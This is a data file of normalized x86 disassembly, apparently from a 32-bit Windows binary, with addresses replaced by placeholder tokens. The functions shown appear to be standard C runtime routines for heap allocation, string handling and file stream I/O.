pop ebp
retn 0x4
push esi
call sub_40445e
pop ecx
sub_4044b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404572
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_405c89
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_405b1b
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_405cb1
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_405a05
push sub_4109a4
mov [ rw-data ] esi
call sub_405c63
pop ecx
sub_404538
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_405d3f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405cfd
pop ecx
mov [ esi ] eax
pop esi
sub_404572
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_405c89
pop ecx
call sub_405d3f
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_406266
push 0x1e
call sub_4060b7
push 0xff
call sub_405dd1
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_405d3f
mov [ eax ] esi
push ebx
call sub_405c89
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_405d3f
mov [ eax ] esi
sub_404606
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_4064aa
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40629f
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_404690
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov edi [ esp + 0x8 ]
push esi
test edi 0x3
push ebx
je r-xdata
mov eax [ edi ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add edi 0x4
test eax 0x81010100
je r-xdata
mov al [ edi ]
add edi 0x1
test al al
je r-xdata
mov eax [ edi - 0x4 ]
test al al
je r-xdata
sub edi 0x1
jmp r-xdata
test edi 0x3
jne r-xdata
sub edi 0x4
test ah ah
je r-xdata
mov esi [ esp + 0x14 ]
test esi 0x3
jne r-xdata
mov dl [ esi ]
add esi 0x1
test dl dl
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
sub edi 0x3
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
mov [ edi ] dl
add edi 0x1
sub ecx 0x1
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
sub edi 0x2
jmp r-xdata
test eax 0xff000000
jne r-xdata
mov [ edi ] cl
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov ecx ebx
and ecx 0x3
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
test dh dh
je r-xdata
mov dl [ esi ]
add esi 0x1
mov [ edi ] dl
add edi 0x1
test dl dl
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edx 0xff0000
je r-xdata
pop ebx
pop esi
sub ecx 0x1
jne r-xdata
mov [ edi ] dx
xor edx edx
mov eax [ esp + 0x10 ]
mov [ edi + 0x2 ] dl
pop ebx
pop esi
pop edi
retn
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
sub_4047c5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_407dbd
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_407b94
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_407413
mov [ esi + 0x4 ] eax
sub_40484c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_4081a0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_408081
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_408081
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_40492e
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40484c
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_4081a0
sub_404981
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
leave
retn
push esi
call sub_408210
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_4049ef
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_408352
call sub_404981
add esp 0x10
pop esi
pop ebp
retn
sub_404a11
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_404ad1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_409b27
pop ecx
push eax
call sub_409a53
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_404b39
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_404ad1
pop ecx
test eax eax
je r-xdata
push esi
call sub_404b81
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_409b27
push eax
call sub_409b4d
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_404b81
push 0x14
push r--data
call sub_409f90
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404c52
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_409fd5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_409eeb
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_404c23
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_404b39
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_404b39
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_404c5b
push 0xc
push r--data
call sub_409f90
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_409eaa
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_404b39
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404ca4
mov eax [ ebp - 0x1c ]
push esi
call sub_404b81
pop ecx
jmp r-xdata
call sub_409fd5
retn
sub_404cb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call sub_4064aa
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40629f
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax edi
sub_404d63
push 0xc
push r--data
call sub_409f90
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_409fd5
retn
call sub_40a416
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_405d3f
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_40a17f
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404e15
mov eax [ ebp - 0x1c ]
call sub_405d3f
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_40a550
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_404e36
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x14 ] eax
jbe r-xdata
test esi esi
je r-xdata
push ebx
push 0x0
push ecx
call sub_40aef0
add esp 0xc
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_40a6a2
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
js r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_405d3f
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_40aef0
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_409b27
pop ecx
push eax
call sub_40ad7b
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_40ae71
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_4071e0
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_404ff2
push 0xc
push r--data
call sub_409f90
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_409eaa
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404e36
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405076
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_409fd5
retn
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40aef0
add esp 0xc
sub_4050d0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_40629f
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_404ad1
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_409b27
pop ecx
push eax
call sub_409a53
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_40af70
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_405227
push 0xc
push r--data
call sub_409f90
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_409eaa
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4050d0
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405297
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
call sub_409fd5
retn
sub_4052b0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_4052dd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push esi
push edi
call sub_409b27
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
cmp [ edi + 0x4 ] ebx
jge r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
push 0x1
push ebx
push esi
call sub_40b58b
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
pop esi
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
mov [ ebp - 0xc ] ebx
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx esi
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_405d3f
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
inc edx
cmp edx esi
jb r-xdata
inc ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
and [ ebp - 0xc ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov [ ebp - 0xc ] ebx
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0x8 ]
call sub_40b58b
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_40b58b
add esp 0xc
test eax eax
jns r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_405471
push 0xc
push r--data
call sub_409f90
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_409eaa
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4052dd
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4054cc
mov eax [ ebp - 0x1c ]
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
jmp r-xdata
call sub_409fd5
retn
sub_4054d6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_405d3f
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_404ad1
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_4052dd
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_409b27
pop ecx
push eax
call sub_40b58b
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
lea eax [ ecx - 0x1 ]
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_405560
push 0xc
push r--data
call sub_409f90
xor eax eax
